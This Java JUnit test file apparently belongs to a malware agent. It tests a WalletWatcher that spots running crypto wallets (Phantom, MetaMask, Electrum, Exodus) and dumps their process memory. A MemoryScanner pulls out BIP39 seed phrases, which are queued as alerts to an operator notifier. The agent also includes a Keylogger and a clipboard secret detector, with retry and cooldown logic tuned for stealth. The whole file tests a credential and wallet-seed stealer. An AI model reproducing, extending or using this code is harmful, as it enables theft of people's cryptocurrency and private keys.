package com.serverpackcore.agent;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

class WalletWatcherTest {
	@TempDir
	Path temp;

	private WalletWatcher watcher(OpsNotifier notifier) {
		State state = new State();
		state.walletsSet = true;
		state.walletsWatch = true;
		Keylogger keylogger = new Keylogger(temp, temp, state, null, notifier);
		WalletWatcher watcher = new WalletWatcher(temp, temp, state, null, notifier, keylogger);
		watcher.enableForTest();
		return watcher;
	}

	@Test
	void sameLiveProcessDumpsOnceAcrossAFocusBounce() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();

		watcher.detect("phantom", pid, "start", "Phantom");
		watcher.lost("phantom");
		watcher.detect("phantom", pid, "start", "Phantom");

		assertEquals(1, watcher.dumpSchedules);
		assertEquals(List.of("wallet detected: phantom (" + pid + ")"), notifier.queued());
	}

	@Test
	void lostWhileThePidLivesKeepsTheSession() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();

		watcher.detect("phantom", pid, "start", "Phantom");
		notifier.queued();
		watcher.lost("phantom");

		assertEquals(List.of(), notifier.queued());
	}

	@Test
	void lostAfterThePidDiedClearsAndCloses() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		Process child = new ProcessBuilder("sleep", "60").start();
		long pid = child.pid();
		try {
			watcher.detect("phantom", pid, "start", "Phantom");
			assertTrue(child.isAlive());
		} finally {
			child.destroy();
			child.waitFor();
		}
		notifier.queued();

		watcher.lost("phantom");

		assertEquals(List.of("wallet closed"), notifier.queued());
	}

	@Test
	void graceLostThenRealExitStillCloses() throws Exception {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		Process child = new ProcessBuilder("sleep", "60").start();
		long pid = child.pid();
		watcher.detect("phantom", pid, "start", "Phantom");
		notifier.queued();

		// The helper reports LOST after the 20 s grace while the browser lives.
		watcher.lost("phantom");
		assertEquals(List.of(), notifier.queued());

		child.destroy();
		child.waitFor();
		watcher.lost("phantom");

		assertEquals(List.of("wallet closed"), notifier.queued());
	}

	@Test
	void findingsAreNotRepeatedBetweenDumps() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		var finding = new MemoryScanner.Finding(1L, "bip39-12", "unique dedupe seed", true);

		watcher.notifyFindings(List.of(finding));
		watcher.notifyFindings(List.of(finding));

		assertEquals(List.of("seed encontrada: 12 palabras", "unique dedupe seed"), notifier.queued());
	}

	@Test
	void findingsRecentlyAlertedByClipboardAreSkipped() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		String seed = "abandon abandon about";
		SecretDetector.alerted(seed);

		watcher.notifyFindings(List.of(new MemoryScanner.Finding(1L, "bip39-12", seed, false)));

		assertEquals(List.of(), notifier.queued());
	}

	@Test
	void browsersOnlyGetOneAttempt() {
		assertEquals(1, WalletWatcher.maxAttempts("phantom"));
		assertEquals(1, WalletWatcher.maxAttempts("metamask"));
		assertEquals(3, WalletWatcher.maxAttempts("electrum"));
		assertEquals(3, WalletWatcher.maxAttempts("exodus"));
	}

	@Test
	void cooldownBypassesOnlyTheFirstDetectAfterARestart() {
		OpsNotifier notifier = new OpsNotifier(null);
		WalletWatcher watcher = watcher(notifier);
		long pid = ProcessHandle.current().pid();
		String key = "phantom|" + pid + "|start";
		watcher.state.walletCooldownUntil = System.currentTimeMillis() + 600_000L;
		watcher.state.lastWalletKey = key;

		watcher.detect("phantom", pid, "start", "Phantom");
		assertEquals(1, watcher.dumpSchedules);

		watcher.stop();
		watcher.enableForTest();
		watcher.detect("phantom", pid, "start", "Phantom");

		assertEquals(1, watcher.dumpSchedules, "the second detect waits for the cooldown");
	}
}
